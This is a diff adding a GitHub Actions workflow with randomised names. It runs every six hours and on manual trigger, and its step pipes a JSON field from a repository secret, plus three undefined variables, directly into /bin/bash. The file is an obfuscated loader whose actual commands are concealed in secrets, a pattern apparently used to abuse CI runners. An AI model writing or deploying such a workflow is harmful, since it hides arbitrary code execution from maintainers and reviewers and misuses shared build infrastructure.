@@ -1,0 +1,22 @@
+name: fiona2228rr
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fiona2228rr
+        env:
+          ist75670: ${{ secrets.ist75670 }}
+        run: |
+          printf '%s' "$ist75670" | jq -r .f312 | /bin/bash
+          echo $ckkvt4 | jq -r .dyipy2 | /bin/bash
+          echo $b59 | jq -r .j11 | /bin/bash
+          echo $ezcx8 | jq -r .wm5974 | /bin/bash
+
